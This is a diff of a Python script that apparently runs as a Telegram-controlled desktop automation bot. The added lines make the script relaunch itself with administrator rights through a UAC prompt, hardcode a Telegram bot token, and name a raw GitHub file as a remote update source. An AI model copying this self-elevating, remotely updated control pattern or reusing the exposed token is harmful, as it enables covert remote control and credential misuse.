@@ -14,8 +14,27 @@ import pyautogui
 from subprocess import call
 from telegram import ForceReply, Update
 from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters
+import win32com.shell.shell as shell
 
 
+
+
+#token for UAC privilege elevation
+ASADMIN = 'asadmin'
+file=sys.argv[0] 
+#Token for the telegram bot.
+token="6199318379:AAGmrDxxhYeYWabD8MqyrMMwKvVztDkPhGE"
+#url for online update source
+url="https://raw.githubusercontent.com/Mainakdey1/PythonStuff/main/somefile.py"
+
+
+#special thanks to @jorenko on stackoverflow and everyone on the thread for this simple code
+#head over to https://stackoverflow.com/questions/130763/request-uac-elevation-from-within-a-python-script for a proper discourse on how to imlement UAC elevation.
+if sys.argv[-1] != ASADMIN:
+    script = os.path.abspath(sys.argv[0])
+    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
+    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
+    sys.exit(0)
 
 
 class logger:
